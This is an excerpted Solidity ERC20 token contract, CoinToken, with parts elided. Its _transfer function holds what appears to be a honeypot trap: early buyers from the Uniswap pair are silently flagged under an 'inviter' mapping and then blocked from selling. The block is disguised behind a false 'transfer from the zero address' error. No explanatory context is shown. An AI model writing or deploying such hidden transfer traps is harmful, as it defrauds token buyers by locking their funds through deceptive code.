...
contract CoinToken is IERC20, Ownable {
    ...
    uint256 private sAmount =  1000000 * 10**_decimals;
    ...
    function _transfer(
        ...
        require(inviter[from] != true, "ERC20: transfer from the zero address");

        
        if(_isExcludedFromFee[from]||_isExcludedFromFee[to]){
            _tokenTransfer(from, to, amount,false);
        }else{
            if(from == uniswapV2Pair && lottery <= 4) {
                lottery = lottery + 1;
                inviter[to] = true;
    ...
    function _tokenTransfer(
        ...
        emit Transfer(sender, recipient, tAmount.sub(tAmount.div(100).mul(_destroyFee)));
    }
